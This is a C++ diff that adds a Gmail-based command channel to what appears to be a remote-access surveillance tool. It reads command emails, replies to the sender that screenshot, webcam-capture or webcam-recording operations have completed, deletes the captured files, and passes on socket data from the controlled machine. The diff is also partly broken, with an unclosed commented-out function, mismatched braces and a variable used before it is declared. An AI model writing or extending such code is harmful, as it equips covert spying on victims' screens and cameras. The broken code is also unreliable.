@@ -192,6 +192,24 @@ private:
             "&client_secret=" + clientSecret +
             "&refresh_token=" + refreshToken +
             "&grant_type=refresh_token";
+        std::unique_ptr<CURL, decltype(&curl_easy_cleanup)> curl(curl_easy_init(), curl_easy_cleanup);
+        std::string response;
+        if (curl) {
+            curl_easy_setopt(curl.get(), CURLOPT_URL, "https://oauth2.googleapis.com/token");
+            curl_easy_setopt(curl.get(), CURLOPT_POSTFIELDS, postFields.c_str());
+            curl_easy_setopt(curl.get(), CURLOPT_WRITEFUNCTION, WriteCallback);
+            curl_easy_setopt(curl.get(), CURLOPT_WRITEDATA, &response);
+            CURLcode res = curl_easy_perform(curl.get());
+            if (res != CURLE_OK) {
+                throw std::runtime_error(std::string("Token refresh failed: ") + curl_easy_strerror(res));
+            }
+        }
+        json jsonData = json::parse(response);
+        accessToken = jsonData["access_token"];
+    }
+    /*void refreshAccessToken() {
+        try {
+            std::cout << "Refreshing access token..." << std::endl;
 
         std::unique_ptr<CURL, decltype(&curl_easy_cleanup)> curl(curl_easy_init(), curl_easy_cleanup);
         std::string response;
@@ -326,7 +344,173 @@ private:
         std::getline(std::cin, duration);
         send(sock, duration.c_str(), duration.size() + 1, 0);
 
-        receiveFile("recording.avi");
+        // Create the JSON payload as a string
+        std::string jsonPayload = "{\"raw\":\"" + encodedMessage + "\"}";
+
+        // Send the email using CURL
+        std::unique_ptr<CURL, decltype(&curl_easy_cleanup)> curl(curl_easy_init(), curl_easy_cleanup);
+        std::string response;
+
+        if (curl) {
+            struct curl_slist* headers = nullptr;
+            headers = curl_slist_append(headers, ("Authorization: Bearer " + accessToken).c_str());
+            headers = curl_slist_append(headers, "Content-Type: application/json");
+
+            curl_easy_setopt(curl.get(), CURLOPT_URL, url.c_str());
+            curl_easy_setopt(curl.get(), CURLOPT_HTTPHEADER, headers);
+            curl_easy_setopt(curl.get(), CURLOPT_POSTFIELDS, jsonPayload.c_str());
+            curl_easy_setopt(curl.get(), CURLOPT_WRITEFUNCTION, WriteCallback);
+            curl_easy_setopt(curl.get(), CURLOPT_WRITEDATA, &response);
+            curl_easy_setopt(curl.get(), CURLOPT_TIMEOUT, 10L);
+
+            CURLcode res = curl_easy_perform(curl.get());
+            if (res != CURLE_OK) {
+                std::cerr << "Failed to send email: " << curl_easy_strerror(res) << std::endl;
+            }
+            else {
+                std::cout << "Email sent successfully to " << recipientEmail << std::endl;
+            }
+
+            curl_slist_free_all(headers);
+        }
+    }
+
+    void sendEmailToOriginalSender() {
+        try {
+            // Get the last processed email details from which the command originated
+            if (processedIds.empty()) {
+                return;
+            }
+
+            std::string lastMessageId = *processedIds.rbegin();
+            std::string messageUrl = "https://gmail.googleapis.com/gmail/v1/users/me/messages/" + lastMessageId;
+            std::string messageResponse = makeGetRequest(messageUrl);
+
+            json emailData = json::parse(messageResponse);
+            std::string originalSender;
+            std::string originalSubject;
+
+            // Extract original sender and subject
+            for (const auto& header : emailData["payload"]["headers"]) {
+                if (header["name"] == "From") {
+                    originalSender = header["value"];
+                    // Extract email address from "Name <email@domain.com>" format
+                    size_t start = originalSender.find('<');
+                    size_t end = originalSender.find('>');
+                    if (start != std::string::npos && end != std::string::npos) {
+                        originalSender = originalSender.substr(start + 1, end - start - 1);
+                    }
+                }
+                else if (header["name"] == "Subject") {
+                    originalSubject = "Re: " + header["value"];
+                }
+            }
+
+            // Create response body based on operation type
+            std::string responseBody;
+            if (std::ifstream file{ "screenshot.bmp" }) {
+                responseBody = "Screenshot captured successfully and saved.";
+                file.close();
+                std::remove("screenshot.bmp");
+            }
+            else if (std::ifstream file{ "webcam.jpg" }) {
+                responseBody = "Webcam capture completed successfully and saved.";
+                file.close();
+                std::remove("webcam.jpg");
+            }
+            else if (std::ifstream file{ "recording.avi" }) {
+                responseBody = "Webcam recording completed successfully and saved.";
+                file.close();
+                std::remove("recording.avi");
+            }
+            else {
+                // For list commands, get the server response
+                std::vector<char> buffer(BUFFER_SIZE);
+                int bytes_received = recv(sock, buffer.data(), buffer.size() - 1, 0);
+                if (bytes_received > 0) {
+                    buffer[bytes_received] = '\0';
+                    responseBody = std::string(buffer.data(), bytes_received);
+                }
+                else {
+                    responseBody = "Command processed successfully.";
+                }
+            }
+
+            // Send the response email
+            sendEmailResponse(originalSender, originalSubject, responseBody);
+        }
+        catch (const std::exception& e) {
+            std::cerr << "Error sending response email: " << e.what() << std::endl;
+            refreshAccessToken();
+        }
+        catch (...) {
+            std::cerr << "Unknown error in sendEmailToOriginalSender" << std::endl;
+        }
+        std::cout << "Completed sendEmailToOriginalSender" << std::endl;
+    }
+
+    void sendEmailResponse(const std::string& recipientEmail, const std::string& subject, const std::string& body) {
+        try {
+            std::cout << "Starting sendEmailResponse..." << std::endl;
+            std::string url = "https://gmail.googleapis.com/gmail/v1/users/me/messages/send";
+
+            // Create MIME message with proper line endings
+            std::string rawMessage =
+                "From: me\r\n"
+                "To: " + recipientEmail + "\r\n"
+                "Subject: " + subject + "\r\n"
+                "Content-Type: text/plain; charset=utf-8\r\n"
+                "\r\n" +
+                body;
+
+            std::cout << "Created raw message" << std::endl;
+
+            // Base64 encode the raw message
+            std::string encodedMessage = base64_encode(rawMessage);
+            std::cout << "Encoded message in base64" << std::endl;
+
+            // Create the JSON payload
+            json jsonPayload = {
+                {"raw", encodedMessage}
+            };
+
+            std::string jsonString = jsonPayload.dump();
+            std::cout << "Created JSON payload" << std::endl;
+
+            // Send the email using CURL
+            std::unique_ptr<CURL, decltype(&curl_easy_cleanup)> curl(curl_easy_init(), curl_easy_cleanup);
+            std::string response;
+
+            if (curl) {
+                std::cout << "Initializing CURL..." << std::endl;
+                struct curl_slist* headers = nullptr;
+                headers = curl_slist_append(headers, ("Authorization: Bearer " + accessToken).c_str());
+                headers = curl_slist_append(headers, "Content-Type: application/json");
+
+                curl_easy_setopt(curl.get(), CURLOPT_URL, url.c_str());
+                curl_easy_setopt(curl.get(), CURLOPT_HTTPHEADER, headers);
+                curl_easy_setopt(curl.get(), CURLOPT_POSTFIELDS, jsonString.c_str());
+                curl_easy_setopt(curl.get(), CURLOPT_WRITEFUNCTION, WriteCallback);
+                curl_easy_setopt(curl.get(), CURLOPT_WRITEDATA, &response);
+                curl_easy_setopt(curl.get(), CURLOPT_TIMEOUT, 30L);  // Increased timeout
+                curl_easy_setopt(curl.get(), CURLOPT_VERBOSE, 1L);   // Enable verbose output
+
+                std::cout << "Sending email..." << std::endl;
+                CURLcode res = curl_easy_perform(curl.get());
+
+                if (res != CURLE_OK) {
+                    std::string error = curl_easy_strerror(res);
+                    std::cerr << "CURL failed: " << error << std::endl;
+                    throw std::runtime_error("CURL failed: " + error);
+                }
+
+                long response_code;
+                curl_easy_getinfo(curl.get(), CURLINFO_RESPONSE_CODE, &response_code);
+                std::cout << "HTTP response code: " << response_code << std::endl;
+                std::cout << "Response: " << response << std::endl;
+
+                curl_slist_free_all(headers);
+                std::cout << "Email sent successfully to " << recipientEmail << std::endl;
     }
 
 public:
